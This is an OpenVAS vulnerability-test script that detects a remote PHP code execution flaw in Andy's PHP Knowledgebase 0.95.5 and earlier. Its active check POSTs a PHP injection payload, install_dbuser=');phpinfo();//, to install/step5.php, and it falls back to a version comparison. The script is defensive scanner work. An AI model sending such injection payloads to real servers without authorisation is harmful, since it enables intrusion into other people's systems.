###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_aphpkb_code_exec_vuln.nasl 12932 2019-01-03 16:38:36Z cfischer $
#
# Andy's PHP Knowledgebase 'step5.php' Remote PHP Code Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:aphpkb:aphpkb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902519");
  script_version("$Revision: 12932 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-03 17:38:36 +0100 (Thu, 03 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_bugtraq_id(47918);
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:C");
  script_name("Andy's PHP Knowledgebase 'step5.php' Remote PHP Code Execution Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_aphpkb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("aphpkb/installed");

  script_xref(name:"URL", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/47918.txt");
  script_xref(name:"URL", value:"http://aphpkb.sourceforge.net");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to execute
  arbitrary PHP code within the context of the affected web server process.");

  script_tag(name:"affected", value:"Andy's PHP Knowledgebase version 0.95.5 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied
  input passed via the 'install_dbuser' parameter to 'step5.php', that allows
  attackers to execute arbitrary PHP code.");

  script_tag(name:"solution", value:"Upgrade to version 0.95.6 or later.");

  script_tag(name:"summary", value:"This host is running Andy's PHP Knowledgebase and is prone to
  remote PHP code execution vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!infos = get_app_version_and_location(cpe:CPE, port:port, exit_no_version:FALSE))
  exit(0);

path = infos['location'];

## Not a safe check
if(!safe_checks()) {

  url = string(path, "/install/step5.php");
  data = "install_dbuser=');phpinfo();//&submit=Continue";

  req = http_post_req(port:port, url:url, data:data, add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"));
  res = http_keepalive_send_recv(port:port, data:req);

  if(http_vuln_check(port:port, url:url, pattern:'>phpinfo()<', extra_check: make_list('>System <', '>Configuration<', '>PHP Core<'))){
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

vers = infos['version'];
if(!vers)
  exit(0);

if(version_is_less_equal(version:vers, test_version:"0.95.5")){
  report = report_fixed_ver(installed_version:vers, fixed_version:"0.95.6", install_path:path);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
